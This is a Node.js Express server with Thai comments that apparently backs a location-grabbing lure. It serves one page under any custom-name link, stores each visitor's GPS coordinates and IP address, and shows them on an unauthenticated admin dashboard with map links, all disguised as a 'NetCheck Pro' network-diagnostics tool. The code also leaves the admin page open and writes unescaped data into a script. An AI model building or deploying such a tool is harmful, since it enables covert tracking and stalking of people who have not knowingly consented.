const express = require("express");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

const locations = [];

// หน้าเว็บ
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ลิงก์ชื่อเอง
app.get("/:name", (req, res, next) => {
  if (req.params.name === "admin") return next();
  res.sendFile(path.join(__dirname, "index.html"));
});

// รับตำแหน่ง
app.post("/location", (req, res) => {
  const { latitude, longitude, time } = req.body;
  locations.push({ latitude, longitude, time, ip: req.ip });
  res.json({ success: true });
});

// หลังบ้าน
app.get("/admin", (req, res) => {
  const data = JSON.stringify(locations);
  res.send(`<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin · NetCheck Pro</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Thai:wght@300;400;500&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'IBM Plex Sans Thai',sans-serif;background:#0a0e1a;color:#c8d8f0;min-height:100vh;padding:32px 24px;position:relative}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 40% at 50% 0%,rgba(30,80,160,.15) 0%,transparent 65%);pointer-events:none;z-index:0}
.grid-bg{position:fixed;inset:0;background-image:linear-gradient(rgba(50,100,200,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(50,100,200,.05) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
.wrap{max-width:960px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px;opacity:0;animation:fadeUp .5s ease .05s forwards}
.header-left{display:flex;align-items:center;gap:10px}
.logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#1e50a0,#2d7dd2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:17px}
.header-text h1{font-size:15px;font-weight:500;color:#e8f0ff;letter-spacing:.02em}
.header-text p{font-size:11px;color:#5a7aaa;font-family:'IBM Plex Mono',monospace}
.live-dot{display:flex;align-items:center;gap:6px;font-size:11px;color:#4dc890;font-family:'IBM Plex Mono',monospace}
.live-dot::before{content:'';width:7px;height:7px;background:#4dc890;border-radius:50%;animation:blink 1.4s ease-in-out infinite}
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;opacity:0;animation:fadeUp .5s ease .15s forwards}
.stat-card{background:rgba(12,20,40,.85);border:1px solid rgba(50,100,200,.18);border-radius:12px;padding:16px 18px;backdrop-filter:blur(8px)}
.stat-label{font-size:10px;font-family:'IBM Plex Mono',monospace;color:#3a6aaa;letter-spacing:.1em;text-transform:uppercase;margin-bottom:6px}
.stat-value{font-size:26px;font-weight:500;color:#e8f0ff;font-family:'IBM Plex Mono',monospace}
.table-card{background:rgba(12,20,40,.85);border:1px solid rgba(50,100,200,.18);border-radius:16px;overflow:hidden;backdrop-filter:blur(8px);opacity:0;animation:fadeUp .5s ease .25s forwards}
.table-header{padding:16px 20px;border-bottom:1px solid rgba(50,100,200,.12);display:flex;align-items:center;justify-content:space-between}
.table-title{font-size:12px;font-family:'IBM Plex Mono',monospace;color:#3a6aaa;letter-spacing:.1em;text-transform:uppercase}
.entry-count{font-size:11px;font-family:'IBM Plex Mono',monospace;color:#2d5a8a}
table{width:100%;border-collapse:collapse}
thead th{padding:10px 20px;text-align:left;font-size:10px;font-family:'IBM Plex Mono',monospace;color:#2d5a8a;letter-spacing:.1em;text-transform:uppercase;border-bottom:1px solid rgba(50,100,200,.1);font-weight:400}
tbody tr{border-bottom:1px solid rgba(50,100,200,.07);transition:background .15s;opacity:0;animation:rowIn .4s ease forwards}
tbody tr:hover{background:rgba(30,60,120,.2)}
tbody tr:last-child{border-bottom:none}
td{padding:13px 20px;font-size:12px;font-family:'IBM Plex Mono',monospace;color:#8aaad0;vertical-align:middle}
td.time-col{color:#5a7aaa;font-size:11px}
td.coord{color:#c8d8f0;font-weight:500}
td.ip-col{color:#6a9aaa}
.map-btn{display:inline-flex;align-items:center;gap:5px;padding:5px 11px;border:1px solid rgba(50,100,200,.3);border-radius:6px;background:rgba(20,60,140,.25);color:#6090d0;font-size:10px;font-family:'IBM Plex Mono',monospace;text-decoration:none;transition:all .15s;letter-spacing:.05em}
.map-btn:hover{background:rgba(30,80,170,.4);border-color:rgba(80,140,255,.5);color:#a0c0f0}
.map-btn svg{width:11px;height:11px;opacity:.8}
.empty-state{padding:48px 20px;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:#2d5a8a;letter-spacing:.08em}
@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
@keyframes rowIn{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:translateX(0)}}
</style>
</head>
<body>
<div class="grid-bg"></div>
<div class="wrap">
  <div class="header">
    <div class="header-left">
      <div class="logo-icon">📡</div>
      <div class="header-text">
        <h1>NetCheck Pro · Admin</h1>
        <p>location_nodes · diagnostics log</p>
      </div>
    </div>
    <div class="live-dot">LIVE</div>
  </div>
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-label">Total Entries</div>
      <div class="stat-value" id="statTotal">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Unique IPs</div>
      <div class="stat-value" id="statIPs">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Last Ping</div>
      <div class="stat-value" id="statLast" style="font-size:14px;padding-top:6px">—</div>
    </div>
  </div>
  <div class="table-card">
    <div class="table-header">
      <span class="table-title">Node Log</span>
      <span class="entry-count" id="entryCount">0 entries</span>
    </div>
    <table>
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>IP Address</th>
          <th>Map</th>
        </tr>
      </thead>
      <tbody id="tbody"></tbody>
    </table>
  </div>
</div>
<script>
const data = ${data};
const tbody = document.getElementById('tbody');
const uniqueIPs = new Set(data.map(d => d.ip)).size;
document.getElementById('statTotal').textContent = data.length;
document.getElementById('statIPs').textContent = uniqueIPs;
document.getElementById('statLast').textContent = data.length ? data[data.length-1].time : '—';
document.getElementById('entryCount').textContent = data.length + ' entries';
if (!data.length) {
  tbody.innerHTML = '<tr><td colspan="5" class="empty-state">NO DATA · รอการวินิจฉัย</td></tr>';
} else {
  tbody.innerHTML = [...data].reverse().map((loc, i) => \`
    <tr style="animation-delay:\${i * 0.06}s">
      <td class="time-col">\${loc.time}</td>
      <td class="coord">\${Number(loc.latitude).toFixed(4)}</td>
      <td class="coord">\${Number(loc.longitude).toFixed(4)}</td>
      <td class="ip-col">\${loc.ip}</td>
      <td>
        <a class="map-btn" href="https://maps.google.com/?q=\${loc.latitude},\${loc.longitude}" target="_blank">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/>
            <circle cx="12" cy="9" r="2.5"/>
          </svg>
          MAP
        </a>
      </td>
    </tr>
  \`).join('');
}
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
